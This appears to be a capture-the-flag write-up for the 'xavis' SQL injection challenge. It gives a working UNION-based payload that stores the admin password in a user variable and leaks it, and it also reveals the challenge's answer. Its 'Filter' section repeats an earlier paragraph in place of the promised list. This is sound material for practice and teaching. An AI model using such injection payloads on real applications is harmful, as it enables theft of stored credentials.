---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 19
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/fd332084-b8f3-4deb-ad35-fedd5d2021f5)

We are provided with the SQL query:

```sql
SELECT id FROM prob_xavis WHERE id='admin' AND pw='{$_GET[pw]}'
```

For this challenge, the password is in Korean. There are two ways of solving this challenge.

## Filter

The code filters the following:

For this challenge, the password is in Korean. There are two ways of solving this challenge.

1. Assigning the password to a variable and leaking the variable
2. Blind SQL Injection

## Assigning the password a variable and leaking the variable

If we provide the following URI parameter:

```
?pw=' or (SELECT @adminpassword:=pw WHERE id='admin') UNION SELECT @adminpassword %23
```

The resultant query becomes:

```sql
SELECT id FROM prob_xavis WHERE id='admin' AND pw='' or (SELECT @adminpassword:=pw WHERE id='admin') UNION SELECT @adminpassword -- -'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/6bad479f-f987-4106-bf7f-cd348902bf6c)

As we can see, the password which was stored in the `adminpassword` variable has been leaked.

```
우왕굳
```

We can now provide the following URI:

```
?pw=우왕굳
```

The resultant query becomes:

```sql
SELECT id FROM prob_xavis WHERE id='admin' AND pw='우왕굳'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/30da5ecc-5dec-4a67-9d19-509490f2753f)
